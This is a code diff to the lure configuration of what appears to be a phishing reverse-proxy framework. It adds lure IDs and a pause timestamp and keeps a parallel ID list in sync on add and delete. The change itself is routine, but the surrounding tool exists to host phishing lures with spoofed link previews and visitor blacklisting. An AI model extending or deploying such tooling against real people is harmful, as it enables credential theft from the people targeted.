@@ -15,6 +15,7 @@ import (
 var BLACKLIST_MODES = []string{"all", "unauth", "noadd", "off"}
 
 type Lure struct {
+	Id              string `mapstructure:"id" json:"id" yaml:"id"`
 	Hostname        string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
 	Path            string `mapstructure:"path" json:"path" yaml:"path"`
 	RedirectUrl     string `mapstructure:"redirect_url" json:"redirect_url" yaml:"redirect_url"`
@@ -26,6 +27,7 @@ type Lure struct {
 	OgDescription   string `mapstructure:"og_desc" json:"og_desc" yaml:"og_desc"`
 	OgImageUrl      string `mapstructure:"og_image" json:"og_image" yaml:"og_image"`
 	OgUrl           string `mapstructure:"og_url" json:"og_url" yaml:"og_url"`
+	PausedUntil     int64  `mapstructure:"paused" json:"paused" yaml:"paused"`
 }
 
 type SubPhishlet struct {
@@ -78,6 +80,7 @@ type Config struct {
 	activeHostnames []string
 	redirectorsDir  string
 	lures           []*Lure
+	lureIds         []string
 	subphishlets    []*SubPhishlet
 	cfg             *viper.Viper
 }
@@ -160,6 +163,10 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c.cfg.UnmarshalKey(CFG_PROXY, &c.proxyConfig)
 	c.cfg.UnmarshalKey(CFG_PHISHLETS, &c.phishletConfig)
 	c.cfg.UnmarshalKey(CFG_CERTIFICATES, &c.certificates)
+
+	for i := 0; i < len(c.lures); i++ {
+		c.lureIds = append(c.lureIds, GenRandomToken())
+	}
 
 	return c, nil
 }
@@ -622,6 +629,7 @@ func (c *Config) CleanUp() {
 
 func (c *Config) AddLure(site string, l *Lure) {
 	c.lures = append(c.lures, l)
+	c.lureIds = append(c.lureIds, GenRandomToken())
 	c.cfg.Set(CFG_LURES, c.lures)
 	c.cfg.WriteConfig()
 }
@@ -640,6 +648,7 @@ func (c *Config) SetLure(index int, l *Lure) error {
 func (c *Config) DeleteLure(index int) error {
 	if index >= 0 && index < len(c.lures) {
 		c.lures = append(c.lures[:index], c.lures[index+1:]...)
+		c.lureIds = append(c.lureIds[:index], c.lureIds[index+1:]...)
 	} else {
 		return fmt.Errorf("index out of bounds: %d", index)
 	}
@@ -650,16 +659,19 @@ func (c *Config) DeleteLure(index int) error {
 
 func (c *Config) DeleteLures(index []int) []int {
 	tlures := []*Lure{}
+	tlureIds := []string{}
 	di := []int{}
 	for n, l := range c.lures {
 		if !intExists(n, index) {
 			tlures = append(tlures, l)
+			tlureIds = append(tlureIds, c.lureIds[n])
 		} else {
 			di = append(di, n)
 		}
 	}
 	if len(di) > 0 {
 		c.lures = tlures
+		c.lureIds = tlureIds
 		c.cfg.Set(CFG_LURES, c.lures)
 		c.cfg.WriteConfig()
 	}
